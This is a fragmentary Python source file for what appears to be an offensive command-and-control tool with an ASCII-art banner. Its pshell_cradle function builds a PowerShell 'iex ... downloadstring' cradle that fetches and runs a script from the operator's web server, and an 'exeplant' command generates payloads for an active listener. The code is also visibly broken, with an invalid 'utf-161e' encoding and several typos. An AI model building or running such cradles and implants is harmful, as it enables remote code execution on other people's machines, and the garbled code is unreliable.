...
def banner():
    ...
    print("    (  __  \ (  ___  )(  ____ \(  ____ )(  ___  )(  ____ \  (  ____ \/ ___   )")
    print("    | (  \  )| (   ) || (    \/| (    )|| (   ) || (    \/  | (    \/\/   )  |")
    print("    | |   ) || (___) || (__    | (____)|| |   | || |        | |          /   )")
    print("    | |   | ||  ___  ||  __)   |     __)| |   | || | ____   | |        _/   / ") 
    print("    | |   ) || (   ) || (      | (\ (   | |   | || | \_  )  | |       /   _/  ")  
    print("    | (__/  )| )   ( || )      | ) \ \__| (___) || (___) |  | (____/\(   (__/ ")
    print("    (______/ |/     \||/       |/   \__/(_______)(_______)  (_______/\_______/")
    print("                                                                              ")            
    print("                            VERSION 1.0                                       ")
    print("                                                                              ")
    print("                                     _____                                    ")
...
def pshell_cradle():
    ...
    runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode('utf-161e')
    with open(runner_file, 'w') as f:
        ...
        #if the above line cutss off, it continues as ; Start-Process -FilePath {randomized_exe_file}')
        f.close()
        ...
        try:
            ...
            if command == 'exeplant':
                if listener_counter > 0:
                    ...
                    print('[-] You cannot generate a paylaod without an active listener.')
